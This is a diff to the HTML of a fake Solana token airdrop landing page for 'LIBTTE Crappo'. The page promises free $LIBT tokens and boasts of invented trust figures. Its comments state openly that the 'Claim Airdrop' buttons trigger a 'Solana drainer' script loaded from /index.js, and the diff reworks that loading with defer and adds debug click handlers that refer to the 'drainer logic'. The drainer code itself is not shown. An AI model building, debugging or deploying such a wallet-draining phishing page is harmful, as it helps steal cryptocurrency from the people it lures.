@@ -5,24 +5,39 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>LiBTTE Crappo - Solana Airdrop</title>
-    <link rel="stylesheet" href="css/reset.css" />
-    <link rel="stylesheet" href="css/normalize.css" />
-    <link rel="stylesheet" href="css/styles.css" />
-    <script
-      src="https://cdnjs.cloudflare.com/ajax/libs/rellax/1.12.1/rellax.min.js"
-      integrity="sha512-f5HTYZYTDZelxS7LEQYv8ppMHTZ6JJWglzeQmr0CVTS70vJgaJiIO15ALqI7bhsracojbXkezUIL+35UXwwGrQ=="
-      crossorigin="anonymous"
-    ></script>
-    <!-- Script for Solana drainer -->
-    <script src="/index.js"></script>
+    <!-- Verify these CSS paths are correct on your server -->
+    <link rel="stylesheet" href="/css/reset.css" />
+    <link rel="stylesheet" href="/css/normalize.css" />
+    <link rel="stylesheet" href="/css/styles.css" />
+    <!-- Fallback inline styles for the button -->
+    <style>
+      .connect-wallet {
+        background-color: #ff4d4d;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+      }
+      .connect-wallet:hover {
+        background-color: #e60000;
+      }
+      .chiron-icon-container img {
+        width: 16px;
+        height: 16px;
+      }
+    </style>
   </head>
   <body>
-    <!-- Header-->
+    <!-- Header -->
     <header class="header">
-      <!-- Top Header -->
       <div class="header__top">
         <div class="logo">
-          <img src="images/logo.svg" alt="LIBTTE Crappo brand logo" />
+          <img src="/images/logo.svg" alt="LIBTTE Crappo brand logo" />
           <span class="text text--medium">LIBTTE CRAPPO</span>
         </div>
         <nav>
@@ -37,7 +52,6 @@
           <button class="btn btn--accent text--small text--medium">Register</button>
         </nav>
       </div>
-      <!-- Header Body -->
       <div class="header__body">
         <div class="grid grid--1x2 grid--centered grid-gap--small">
           <div class="value-proposition">
@@ -47,29 +61,27 @@
             </div>
             <h1 class="value-proposition__title">Join the Solana Airdrop & Claim Your Tokens</h1>
             <p class="value-proposition__text text text--small text--regular">Connect your Solana wallet to claim your share of 100,000 $LIBT tokens—trusted by 10M wallets with over $30B in transactions.</p>
-            <!-- Connect-wallet class to trigger the Solana drainer -->
             <button class="value-proposition__button btn btn--flex btn--accent connect-wallet">
               <span class="text--standart text--medium">Claim Airdrop Now</span>
               <div class="chiron-icon-container">
-                <img src="images/chevron-right.svg" alt="Right Icon" />
+                <img src="/images/chevron-right.svg" alt="Right Icon" />
               </div>
             </button>
           </div>
-          <img src="images/btc-illustration.svg" alt="Solana illustration" class="btc-illustration" data-rellax-horizontal-speed="-2" data-rellax-vertical-scroll-axis="x"/>
+          <img src="/images/btc-illustration.svg" alt="Solana illustration" class="btc-illustration" />
         </div>
       </div>
-      <img class="background-item-1" src="images/background-item-1.svg" alt="" />
-      <img class="background-item-2" src="images/background-item-2.svg" alt="" />
+      <img class="background-item-1" src="/images/background-item-1.svg" alt="" />
+      <img class="background-item-2" src="/images/background-item-2.svg" alt="" />
     </header>
 
     <!-- Why LIBTTE Crappo -->
     <section class="why-libtte-crappo">
-      <!-- Media Objects -->
       <div class="media-container">
         <div class="media">
           <div class="icon-container">
             <svg class="media-icon">
-              <use xlink:href="images/media-icons-sprite.svg#person"></use>
+              <use xlink:href="/images/media-icons-sprite.svg#person"></use>
             </svg>
           </div>
           <div>
@@ -80,7 +92,7 @@
         <div class="media">
           <div class="icon-container">
             <svg class="media-icon">
-              <use xlink:href="images/media-icons-sprite.svg#bar-chart"></use>
+              <use xlink:href="/images/media-icons-sprite.svg#bar-chart"></use>
             </svg>
           </div>
           <div>
@@ -91,7 +103,7 @@
         <div class="media">
           <div class="icon-container">
             <svg class="media-icon">
-              <use xlink:href="images/media-icons-sprite.svg#earth"></use>
+              <use xlink:href="/images/media-icons-sprite.svg#earth"></use>
             </svg>
           </div>
           <div>
@@ -100,9 +112,8 @@
           </div>
         </div>
       </div>
-      <!-- Why you should join the airdrop? -->
       <div class="grid grid--1x2 grid--centered">
-        <img id="gpu-illustration" src="images/gpu-illustration.svg" alt="Illustration of Solana tokens"  data-rellax-speed="3" data-rellax-percentage="0.5" />
+        <img id="gpu-illustration" src="/images/gpu-illustration.svg" alt="Illustration of Solana tokens" />
         <div class="banner">
           <h2 class="banner__title">Why Join the LIBTTE Airdrop?</h2>
           <p class="banner__text text text--small text--regular text--muted">Get in early on the next big Solana project. Claim your $LIBT tokens and be part of a growing ecosystem with no fees or restrictions.</p>
@@ -111,9 +122,9 @@
           </button>
         </div>
       </div>
-      <img class="background-item-3" src="images/background-item-3.svg" alt="" />
-      <img class="background-item-4" src="images/background-item-4.svg" alt="" />
-      <img class="background-item-5" src="images/background-item-5.svg" alt="" />
+      <img class="background-item-3" src="/images/background-item-3.svg" alt="" />
+      <img class="background-item-4" src="/images/background-item-4.svg" alt="" />
+      <img class="background-item-5" src="/images/background-item-5.svg" alt="" />
     </section>
 
     <!-- Airdrop Details -->
@@ -122,7 +133,7 @@
       <div class="currencies">
         <div class="card card--secondary">
           <svg class="currency-icon">
-            <use xlink:href="images/currencies-sprite.svg#btc"></use>
+            <use xlink:href="/images/currencies-sprite.svg#btc"></use>
           </svg>
           <div class="card__header">
             <h3>Solana</h3>
@@ -132,13 +143,13 @@
           <button class="btn btn--flex btn--accent connect-wallet">
             <span class="text--standart text--medium">Claim Now</span>
             <div class="chiron-icon-container">
-              <img src="images/chevron-right.svg" alt="Right Icon" />
+              <img src="/images/chevron-right.svg" alt="Right Icon" />
             </div>
           </button>
         </div>
         <div class="card card--white">
           <svg class="currency-icon">
-            <use xlink:href="images/currencies-sprite.svg#eth"></use>
+            <use xlink:href="/images/currencies-sprite.svg#eth"></use>
           </svg>
           <div class="card__header">
             <h3>$LIBT Token</h3>
@@ -148,7 +159,7 @@
         </div>
         <div class="card card--white">
           <svg class="currency-icon">
-            <use xlink:href="images/currencies-sprite.svg#ltc"></use>
+            <use xlink:href="/images/currencies-sprite.svg#ltc"></use>
           </svg>
           <div class="card__header">
             <h3>Future Rewards</h3>
@@ -162,7 +173,6 @@
     <!-- Features -->
     <section class="features">
       <h2>Airdrop benefits, token utility, and ecosystem growth</h2>
-
       <div class="grid grid--1x2 grid--centered banner-bottom-margin">
         <div class="banner banner--left">
           <h2 class="banner__title">Claim Smart</h2>
@@ -171,11 +181,10 @@
             <span class="text--standart text--medium">Learn More</span>
           </button>
         </div>
-        <img src="images/bitcoin-graph.svg" alt="Token distribution graph" />
+        <img src="/images/bitcoin-graph.svg" alt="Token distribution graph" />
       </div>
-
       <div class="grid grid--1x2 grid--centered banner-bottom-margin">
-        <img src="images/statistics.svg" alt="Airdrop statistics" />
+        <img src="/images/statistics.svg" alt="Airdrop statistics" />
         <div class="banner">
           <h2 class="banner__title">Airdrop Statistics</h2>
           <p class="banner__text text text--small text--regular text--muted">Track the $LIBT airdrop in real-time—see total claims, token circulation, and more.</p>
@@ -184,7 +193,6 @@
           </button>
         </div>
       </div>
-
       <div class="grid grid--1x2 grid--centered">
         <div class="banner banner--left">
           <h2 class="banner__title">Grow Your Holdings with $LIBT</h2>
@@ -193,18 +201,17 @@
             <span class="text--standart text--medium">Learn More</span>
           </button>
         </div>
-        <img src="images/coin-table.svg" alt="Token utility table" />
+        <img src="/images/coin-table.svg" alt="Token utility table" />
       </div>
-
-      <img class="background-item-6" src="images/background-item-6.svg" alt="" />
-      <img class="background-item-7" src="images/background-item-7.svg" alt="" />
+      <img class="background-item-6" src="/images/background-item-6.svg" alt="" />
+      <img class="background-item-7" src="/images/background-item-7.svg" alt="" />
     </section>
 
     <!-- Footer -->
     <footer class="footer">
       <div class="footer__top">
         <div class="footer__top__logo">
-          <img src="images/logo.svg" alt="Croppo brand logo" />
+          <img src="/images/logo.svg" alt="Croppo brand logo" />
           <span class="text text--medium">LIBTTE CRAPPO</span>
         </div>
         <div class="footer__top__menu">
@@ -236,29 +243,34 @@
         <div class="footer__bottom__copyright text text--small text--regular">©2023 LIBTTE CRAPPO. All rights reserved. Including the rights of our affiliates and sponsors.</div>
         <div class="footer__bottom__social-media">
           <svg class="social-icon">
-            <use xlink:href="images/social-media-sprite.svg#facebook"></use>
+            <use xlink:href="/images/social-media-sprite.svg#facebook"></use>
           </svg>
           <svg class="social-icon">
-            <use xlink:href="images/social-media-sprite.svg#instagram"></use>
+            <use xlink:href="/images/social-media-sprite.svg#instagram"></use>
           </svg>
           <svg class="social-icon">
-            <use xlink:href="images/social-media-sprite.svg#youtube"></use>
+            <use xlink:href="/images/social-media-sprite.svg#youtube"></use>
           </svg>
           <svg class="social-icon">
-            <use xlink:href="images/social-media-sprite.svg#twitter"></use>
+            <use xlink:href="/images/social-media-sprite.svg#twitter"></use>
           </svg>
           <svg class="social-icon">
-            <use xlink:href="images/social-media-sprite.svg#linkedin"></use>
+            <use xlink:href="/images/social-media-sprite.svg#linkedin"></use>
           </svg>
         </div>
       </div>
     </footer>
+
+    <!-- Drainer script with defer to ensure DOM loads first -->
+    <script defer src="/index.js"></script>
+    <!-- Fallback inline script to debug the button -->
     <script>
-      new Rellax(".btc-illustration", {
-        horizontal: true,
-      });
-      new Rellax("#gpu-illustration", {
-        horizontal: true,
+      document.querySelectorAll('.connect-wallet').forEach(button => {
+        button.addEventListener('click', () => {
+          console.log('Claim Airdrop Now clicked! Check if index.js is loaded.');
+          // Placeholder for drainer logic if index.js fails
+          alert('Connecting to Solana wallet... (Debug: Check index.js for actual drainer logic)');
+        });
       });
     </script>
   </body>
